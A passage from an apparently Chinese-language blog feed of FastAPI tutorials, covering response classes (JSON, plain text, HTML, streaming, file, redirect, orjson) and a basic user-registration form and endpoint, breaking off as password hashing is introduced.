class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI, Request<br><span class="hljs-keyword">from</span> starlette.requests <span class="hljs-keyword">import</span> Request<br>app = FastAPI()<br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/item/&#123;item_id&#125;&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello</span>(<span class="hljs-params">item_id: <span class="hljs-built_in">int</span>, req: Request</span>):<br>    <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-string">&quot;item_id&quot;</span>: item_id,<br>        <span class="hljs-string">&quot;client_host&quot;</span>: req.client.host<br>    &#125;<br></code></pre></td></tr></table></figure><p><strong>补充：直接从Request中获取请求体参数，需要使用async&#x2F;await语法，在下一章我们再详细介绍。</strong></p><h1 id="11-2-直接使用Response对象"><a href="#11-2-直接使用Response对象" class="headerlink" title="11-2 直接使用Response对象"></a>11-2 直接使用Response对象</h1><ul><li><p>关于响应的操作，在前面的章节有涉及到，比如设置<strong>响应状态码</strong>，设置<strong>响应头</strong>，在路径函数内返回数据就可以当做响应体。</p></li><li><p>这些都是FastAPI给我们提供的便捷方式，使用了这些方式，几乎帮助我们处理了大部分常见的需求。</p></li><li><p>不过，在一些<strong>特殊</strong>常场景下，我们需要更加灵活的处理响应。</p></li><li><p>比如，我们已经使用过了，通过Response对象来设置Cookie, 设置响应头等等。</p></li><li><p><strong>本质上，FastAPI借用了Starlette框架的Response对象，即我们使用的Response对象都是Starlette的</strong>。</p></li><li><p><strong>Response对象还有很多其他高进的用法，比如处理重定向、响应其他格式的数据：纯文本&#x2F;HTML&#x2F;XML&#x2F;下载文件等等</strong>。</p></li></ul><p>示例1：使用Response设置状态码&#x2F;响应头&#x2F;cookie</p><ul><li>从FastAPI导入的Response，等价于从starlette.responses导入的Response</li><li>在路径函数中定义的形参<code>response</code>的类型是Response，FastAPI可以是被出来你要手动使用Response对象</li><li>但是，这样的使用方式，本质上依然使用了FastAPI的便捷方式，因为你返回的是”123”，但其实响应格式是”application&#x2F;json”</li><li>这是因为，FastAPI的默认响应方式是JSONResponse，即所有的返回给客户端的数据都会被json序列化</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI, Response <span class="hljs-comment"># 等价</span><br><span class="hljs-keyword">from</span> starlette.responses <span class="hljs-keyword">import</span> Response <span class="hljs-comment"># 等价</span><br>app = FastAPI()<br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello</span>(<span class="hljs-params">response: Response</span>):<br>    response.status_code = <span class="hljs-number">201</span> <span class="hljs-comment"># 设置响应码</span><br>    response.headers[<span class="hljs-string">&quot;x-token&quot;</span>] = <span class="hljs-string">&quot;12345&quot;</span> <span class="hljs-comment"># 设置响应头</span><br>    response.set_cookie(<span class="hljs-string">&quot;token&quot;</span>, <span class="hljs-string">&quot;111111&quot;</span>, <span class="hljs-number">100</span>) <span class="hljs-comment"># 设置响应cookies</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;123&quot;</span><br></code></pre></td></tr></table></figure><p>示例2：直接返回Response对象</p><ul><li>Response类初始化对象一般需要<strong>四个参数</strong></li><li><code>content</code>是响应体的数据，必须是支持编码的字符串。如果要返回的数据是字段，则要使用json序列化</li><li><code>status_code</code> 设置响应的状态码</li><li><code>headers</code> 设置响应头</li><li><code>media_type</code> 设置响应类型，比如说是json格式的数据则值为 <code>application/json</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI, Response <span class="hljs-comment"># 等价下面的</span><br><span class="hljs-keyword">from</span> starlette.responses <span class="hljs-keyword">import</span> Response <span class="hljs-comment"># 等价上面的</span><br>app = FastAPI()<br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span>, </span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello</span>():<br>    response = Response(<br>        content=json.dumps(&#123;<span class="hljs-string">&quot;hello&quot;</span>: <span class="hljs-string">&quot;world&quot;</span>&#125;), <span class="hljs-comment"># 序列化响应体数据</span><br>        status_code=<span class="hljs-number">201</span>, <span class="hljs-comment"># 设定响应状态码</span><br>        headers=&#123;<span class="hljs-string">&quot;x-token&quot;</span>: <span class="hljs-string">&quot;qqqqqq&quot;</span>&#125;, <span class="hljs-comment"># 设定响应头</span><br>        media_type=<span class="hljs-string">&quot;application/json&quot;</span> <span class="hljs-comment"># 设定响应类型</span><br>    ) <span class="hljs-comment"># response=Response(四个参数) 实例化一个Response对象</span><br><br>    <span class="hljs-keyword">return</span> response<br></code></pre></td></tr></table></figure><h1 id="11-3-默认响应方式"><a href="#11-3-默认响应方式" class="headerlink" title="11-3 默认响应方式"></a>11-3 默认响应方式</h1><p>基于上面我们知道，可以直接返回Response对象，使用起来也比较简单，只需要在<strong>实例化对象是按照要求传参即可</strong>。</p><p>但是你会发现，不同类型的响应数据，<strong>都需要手动传参</strong>，这是比较麻烦的。</p><p>其实，FastAPI提供了多种内置的响应方式，比如<strong>对于JSON格式的响应数据</strong>，提供了<code>JSONResponse</code>这种响应类型。</p><p>本质上JSONResponse类是Response这个类的子类，并且JSONResponse是FastAPI中的<strong>默认响应方式</strong>。</p><p>示例1:</p><ul><li>此时直接返回的是字典，但FastAPI内部帮我们处理，返回的数据格式是json的。</li><li>想要修改内置响应方式，可修改FastAPI()中或的APIRouter()中的 <code>default_response_class</code></li><li>还可以对于指定接口，通过 <code>response_class</code>设置响应方式</li><li>优先级：接口 &gt; router &gt; app</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI, APIRouter<br><span class="hljs-keyword">from</span> fastapi.responses <span class="hljs-keyword">import</span> JSONResponse<br><br><br>app = FastAPI(default_response_class=JSONResponse)<span class="hljs-comment"># 设置全局的默认响应方式</span><br>router = APIRouter(default_response_class=JSONResponse) <span class="hljs-comment"># 设置APIRouter所有接口的默认响应方式</span><br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span>, response_class=JSONResponse</span>)</span><span class="hljs-comment"># 设置这个接口的默认响应方式</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello</span>():<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;liixu&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>示例2：源码阅读</p><ul><li>JSONResponse是Response的子类，m默认写死 <code>media_type = &quot;application/json&quot;</code></li><li>并重写了<code>render</code>方法，该方法会在示实例化响应对象时触发，用来把我们传进去的 <code>content</code>序列化。</li><li>因此使用手动JSONResponse时需要保证content是可序列化的，否则报错。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">JSONResponse</span>(<span class="hljs-title class_ inherited__">Response</span>):<br>    media_type = <span class="hljs-string">&quot;application/json&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params"></span><br><span class="hljs-params">        self,</span><br><span class="hljs-params">        content: typing.<span class="hljs-type">Any</span>,</span><br><span class="hljs-params">        status_code: <span class="hljs-built_in">int</span> = <span class="hljs-number">200</span>,</span><br><span class="hljs-params">        headers: typing.<span class="hljs-type">Optional</span>[<span class="hljs-built_in">dict</span>] = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        media_type: typing.<span class="hljs-type">Optional</span>[<span class="hljs-built_in">str</span>] = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        background: typing.<span class="hljs-type">Optional</span>[BackgroundTask] = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params">    </span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-built_in">super</span>().__init__(content, status_code, headers, media_type, background)<br><span class="hljs-comment"># 重写父类方法</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">render</span>(<span class="hljs-params">self, content: typing.<span class="hljs-type">Any</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-keyword">return</span> json.dumps(<br>            content,<br>            ensure_ascii=<span class="hljs-literal">False</span>,<br>            allow_nan=<span class="hljs-literal">False</span>,<br>            indent=<span class="hljs-literal">None</span>,<br>            separators=(<span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-string">&quot;:&quot;</span>),<br>        ).encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br></code></pre></td></tr></table></figure><h1 id="11-4-文本相关的Response"><a href="#11-4-文本相关的Response" class="headerlink" title="11-4 文本相关的Response"></a>11-4 文本相关的Response</h1><p>和文本相关的有<strong>两种</strong>响应方式：</p><ul><li><p><strong>PlainTextResponse</strong></p></li><li><p><strong>HTMLResponse</strong></p></li></ul><p>示例1：PlainTextResponse用来<strong>响应纯文本</strong>的数据</p><ul><li>PlainTextResponse是Response的子类，<strong>重写了</strong>media_type &#x3D; “text&#x2F;plain”，对应响应头中的 <code>content-type: text/plain</code>，此时网页上显示纯文本信息。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI<br><span class="hljs-keyword">from</span> fastapi.responses <span class="hljs-keyword">import</span> PlainTextResponse<br>app = FastAPI()<br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span>, response_class=PlainTextResponse</span>) </span><span class="hljs-comment"># 定义response_class</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello World&quot;</span><br><span class="hljs-comment"># 源码</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">PlainTextResponse</span>(<span class="hljs-title class_ inherited__">Response</span>): <span class="hljs-comment"># 继承</span><br>    media_type = <span class="hljs-string">&quot;text/plain&quot;</span> <span class="hljs-comment"># 重写属性</span><br></code></pre></td></tr></table></figure><p>示例2：HTMLResponse用来响应HTML页面</p><ul><li>HTMLResponse是Response的子类，重写media_type &#x3D; “text&#x2F;html”</li><li>就可以直接返回HTMLResponse对象，网页渲染HTML样式。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI<br><span class="hljs-keyword">from</span> fastapi.responses <span class="hljs-keyword">import</span> HTMLResponse<br><br>app = FastAPI()<br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    html_content = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    &lt;html&gt;</span><br><span class="hljs-string">        &lt;head&gt;</span><br><span class="hljs-string">            &lt;title&gt;Some HTML in here&lt;/title&gt;</span><br><span class="hljs-string">        &lt;/head&gt;</span><br><span class="hljs-string">        &lt;body&gt;</span><br><span class="hljs-string">            &lt;h1&gt;Look ma! HTML!&lt;/h1&gt;</span><br><span class="hljs-string">        &lt;/body&gt;</span><br><span class="hljs-string">    &lt;/html&gt;</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> HTMLResponse(content=html_content, status_code=<span class="hljs-number">200</span>)<br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span>, response_class=HTMLResponse</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    &lt;html&gt;</span><br><span class="hljs-string">        &lt;head&gt;</span><br><span class="hljs-string">            &lt;title&gt;Some HTML in here&lt;/title&gt;</span><br><span class="hljs-string">        &lt;/head&gt;</span><br><span class="hljs-string">        &lt;body&gt;</span><br><span class="hljs-string">            &lt;h1&gt;Look ma! HTML!&lt;/h1&gt;</span><br><span class="hljs-string">        &lt;/body&gt;</span><br><span class="hljs-string">    &lt;/html&gt;</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><span class="hljs-comment"># 源码</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">HTMLResponse</span>(<span class="hljs-title class_ inherited__">Response</span>): <span class="hljs-comment"># 继承</span><br>    media_type = <span class="hljs-string">&quot;text/html&quot;</span><span class="hljs-comment"># 重写属性</span><br>    <br></code></pre></td></tr></table></figure><h1 id="11-5-下载文件相关的Response"><a href="#11-5-下载文件相关的Response" class="headerlink" title="11-5 下载文件相关的Response"></a>11-5 下载文件相关的Response</h1><p>下载文件相关的响应类有两个：</p><ul><li>StreamingResponse</li><li>FileResponse</li></ul><p>示例1：StreamingResponse支持文件类型的操作，下载文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI<br><span class="hljs-keyword">from</span> fastapi.responses <span class="hljs-keyword">import</span> StreamingResponse<br><br>app = FastAPI()<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">iterfile</span>():  <span class="hljs-comment">#</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;mybook.zip&quot;</span>, mode=<span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:  <span class="hljs-comment">#</span><br>            <span class="hljs-keyword">yield</span> <span class="hljs-keyword">from</span> f<br><br>    <span class="hljs-keyword">return</span> StreamingResponse(iterfile(), media_type=<span class="hljs-string">&quot;application/zip&quot;</span>)<br><span class="hljs-comment"># StreamingResponse也是Response 的子类</span><br></code></pre></td></tr></table></figure><p>示例2：使用FileResponse</p><ul><li>更加直接，文件下载</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI<br><span class="hljs-keyword">from</span> fastapi.responses <span class="hljs-keyword">import</span> FileResponse<br><br>app = FastAPI()<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> FileResponse(<span class="hljs-string">&quot;mybook.zip&quot;</span>, filename=<span class="hljs-string">&quot;book.zip&quot;</span>)<span class="hljs-comment"># 第一个参数文件路径，filename指定下载下来的文件名</span><br><span class="hljs-comment"># FileResponse也是Response 的子类</span><br></code></pre></td></tr></table></figure><h1 id="11-6-其他Response"><a href="#11-6-其他Response" class="headerlink" title="11-6 其他Response"></a>11-6 其他Response</h1><p>示例1：重定向Response</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI<br><span class="hljs-keyword">from</span> fastapi.responses <span class="hljs-keyword">import</span> RedirectResponse<br><br>app = FastAPI()<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">go_to_baidu</span>():<br>    <span class="hljs-keyword">return</span> RedirectResponse(<span class="hljs-string">&quot;https://www.baidu.com&quot;</span>)<br></code></pre></td></tr></table></figure><p>示例2：ORJSONResponse</p><ul><li>ORJSONResponse是一个基于orjson序列化的响应类，它在性能上要由于JSONResponse</li><li>使用是需要安装 <code>pip3 install orjson</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI<br><span class="hljs-keyword">from</span> fastapi.responses <span class="hljs-keyword">import</span> ORJSONResponse<br><br>app = FastAPI()<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span>, response_class=ORJSONResponse</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">go_to_baidu</span>():<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;liuxu&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>补充：继承Response， 模仿者其他响应类，定义自己的响应类（自己实现吧）</p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>编程，web开发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【python】FastAPI之登录认证（六）</title>
    <link href="/2024/03/02/686FastAPI6%E4%B9%8B%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81/"/>
    <url>/2024/03/02/686FastAPI6%E4%B9%8B%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81/</url>
    
    <content type="html"><![CDATA[<h1 id="9-1-用户注册"><a href="#9-1-用户注册" class="headerlink" title="9-1 用户注册"></a>9-1 用户注册</h1><p>对于很多应用来说，注册接口是必可不少的。想要实现注册接口，其实很简单，但是你会发现会有很多种选择：</p><ul><li>注册时有需要哪些字段？</li><li>注册接口使用什么请求方式？</li><li>前端朝后端传数据时，放在查询参数中、请求体中？</li><li>如果放在请求体中，使用JSON格式还是表单格式？</li></ul><p><strong>解决方式</strong></p><p>你会发现就一个简单的注册接口，其实还是有很多问题需要我们思考的。</p><ul><li><p>首先，注册接口一般是将用户的个人信息提交给服务端，因此，我们选择POST请求</p></li><li><p>然后，注册信息中一般都包含密码，所以不能简单的在查询参数中提交给后端，需要把数据放在请求体中。</p></li><li><p>最后，请求体如何使用JSON格式，那注册时如果有上传文件的需求，将比较麻烦。因此我们使用Form表单的形式。</p></li></ul><p>结论：对于常见的注册接口，使用POST，使用Form表单来上传数据。</p><p>补充：任何一种方式都可以实现，但最终如何选择还是要看业务需求。</p><p>前端页面代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>注册<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://127.0.0.1:8000/register&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>用户名: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>密码: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>确认密码: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;re_password&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>邮件: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;email&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>后端接口</strong></p><ul><li>注册逻辑：判断用户名是否已经注册；判断二次密码是否一致。</li><li>缺陷：密码没有加密；数据没有持久化（存数据库）。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI, Form, Depends, HTTPException<br><br>app = FastAPI(title=<span class="hljs-string">&quot;登录认证相关&quot;</span>)<br><br><span class="hljs-comment"># 模拟数据库</span><br>USERS = &#123;&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_form_data</span>(<span class="hljs-params">username: <span class="hljs-built_in">str</span> = Form(<span class="hljs-params"></span>), password: <span class="hljs-built_in">str</span> = Form(<span class="hljs-params"></span>), re_password: <span class="hljs-built_in">str</span> = Form(<span class="hljs-params"></span>), email: <span class="hljs-built_in">str</span> = Form(<span class="hljs-params"></span>)</span>): <span class="hljs-comment"># Form()依赖注入</span><br>    <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-string">&quot;username&quot;</span>: username,<br>        <span class="hljs-string">&quot;password&quot;</span>: password,<br>        <span class="hljs-string">&quot;re_password&quot;</span>: re_password,<br>        <span class="hljs-string">&quot;email&quot;</span>: email,<br>    &#125;<br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/register&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>(<span class="hljs-params">form_data: <span class="hljs-built_in">dict</span> = Depends(<span class="hljs-params">get_form_data</span>)</span>):<span class="hljs-comment"># Depends依赖注入</span><br>    <span class="hljs-comment"># 判断用户名是否已存在</span><br>    <span class="hljs-keyword">if</span> form_data[<span class="hljs-string">&quot;username&quot;</span>] <span class="hljs-keyword">in</span> USERS:<br>        <span class="hljs-keyword">raise</span> HTTPException(detail=<span class="hljs-string">&quot;用户名已经存在&quot;</span>, status_code=<span class="hljs-number">400</span>)<br>    <span class="hljs-comment"># 判断密码是否一致</span><br>    <span class="hljs-keyword">if</span> form_data[<span class="hljs-string">&quot;password&quot;</span>] != form_data[<span class="hljs-string">&quot;re_password&quot;</span>]:<br>        <span class="hljs-keyword">raise</span> HTTPException(detail=<span class="hljs-string">&quot;两次密码输入不一致&quot;</span>, status_code=<span class="hljs-number">400</span>)<br>    <span class="hljs-comment"># 保存用户信息，完成注册</span><br>    USERS[form_data[<span class="hljs-string">&quot;username&quot;</span>]] = form_data<br><br>    <span class="hljs-comment"># 返回新用户基本信息</span><br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;username&quot;</span>: form_data[<span class="hljs-string">&quot;username&quot;</span>], <span class="hljs-string">&quot;email&quot;</span>: form_data[<span class="hljs-string">&quot;email&quot;</span>]&#125;<br></code></pre></td></tr></table></figure><h1 id="9-2-用户密码加密"><a href="#9-2-用户密码加密" class="headerlink" title="9-2 用户密码加密"></a>9-2 用户密码加密</h1><p>存用户信息时，不能明文存储，一定要做加密处理。</p><p>示例1： 使用python内置库hasslib  